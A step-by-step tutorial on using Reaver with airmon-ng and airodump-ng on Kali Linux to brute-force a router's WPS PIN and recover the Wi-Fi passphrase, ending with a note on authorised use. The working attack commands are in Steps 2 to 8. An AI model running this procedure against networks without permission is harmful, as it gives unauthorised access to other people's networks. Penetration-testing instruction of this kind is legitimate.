# reaver

Reaver is a tool used in cybersecurity to exploit vulnerabilities in the Wi-Fi Protected Setup (WPS) implementation on many routers, allowing an attacker to gain access to a network by brute-forcing the WPS PIN. Here's a detailed step-by-step tutorial to guide you through using Reaver.

### Step-by-Step Tutorial for Using Reaver

#### Prerequisites
1. **Kali Linux**: Ensure you have Kali Linux installed as it comes pre-installed with Reaver.
2. **Wireless Network Adapter**: Use a wireless network adapter capable of packet injection (e.g., Alfa AWUS036NHA).

#### Step 1: Install Reaver (if not installed)
Reaver usually comes pre-installed with Kali Linux. To check if it's installed, open a terminal and type:
```bash
reaver -h
```
If it's not installed, you can install it using:
```bash
sudo apt-get update
sudo apt-get install reaver
```

#### Step 2: Set Up Your Wireless Adapter
You need to set your wireless adapter to monitor mode to capture packets.
1. **Identify your wireless adapter**:
   ```bash
   ifconfig
   ```
   or
   ```bash
   iwconfig
   ```
   Look for an interface like `wlan0`.

2. **Set the adapter to monitor mode**:
   ```bash
   sudo airmon-ng start wlan0
   ```
   This command will create a new interface (`wlan0mon`).

#### Step 3: Identify the Target Network
Use `airodump-ng` to scan for available networks and identify the target:
```bash
sudo airodump-ng wlan0mon
```
Note the BSSID (MAC address) and the channel (CH) of the target network.

#### Step 4: Focus on the Target Network
Run `airodump-ng` on the specific channel to focus on the target network:
```bash
sudo airodump-ng -c [channel] --bssid [BSSID] -w [filename] wlan0mon
```
Replace `[channel]` with the target's channel, `[BSSID]` with the target's BSSID, and `[filename]` with your desired output file name.

#### Step 5: Run Reaver
With the necessary information, you can now run Reaver to start the brute-force attack on the WPS PIN.
```bash
sudo reaver -i wlan0mon -b [BSSID] -c [channel] -vv
```
Replace `[BSSID]` and `[channel]` with the respective values of the target network. The `-vv` flag enables verbose output.

#### Step 6: Monitoring Progress
Reaver will start trying different PIN combinations to access the network. This process can take several hours depending on the router's response rate and the WPS PIN's complexity. You'll see output indicating each PIN attempt and any progress made.

#### Step 7: Handling Failures
If Reaver gets stuck or isn't making progress, you can try additional options:
- **Change the delay between attempts**:
  ```bash
  sudo reaver -i wlan0mon -b [BSSID] -d [delay] -vv
  ```
  Replace `[delay]` with the desired delay in seconds.

- **Specify the timeout period**:
  ```bash
  sudo reaver -i wlan0mon -b [BSSID] -t [timeout] -vv
  ```
  Replace `[timeout]` with the desired timeout period in seconds.

- **Use advanced options** to handle more resilient routers:
  ```bash
  sudo reaver -i wlan0mon -b [BSSID] -vv -N -S
  ```
  - `-N`: Disables NACK (Negative Acknowledgement) messages.
  - `-S`: Uses small DH keys to improve performance on some routers.

#### Step 8: Gaining Access
Once Reaver successfully finds the WPS PIN, it will display the PIN and the network's WPA/WPA2 passphrase. You can then use this passphrase to connect to the Wi-Fi network.

#### Step 9: Clean Up
After the attack, return your wireless adapter to its original state:
1. **Stop monitoring mode**:
   ```bash
   sudo airmon-ng stop wlan0mon
   ```
2. **Restart network services** (if necessary):
   ```bash
   sudo service NetworkManager restart
   ```

### Ethical Considerations
Always remember to use Reaver responsibly and only on networks you own or have explicit permission to test. Unauthorized access to networks is illegal and unethical.

### Conclusion
By following these steps, you should be able to use Reaver to test the security of Wi-Fi networks protected by WPS. Always ensure you have proper authorization before performing any penetration testing activities.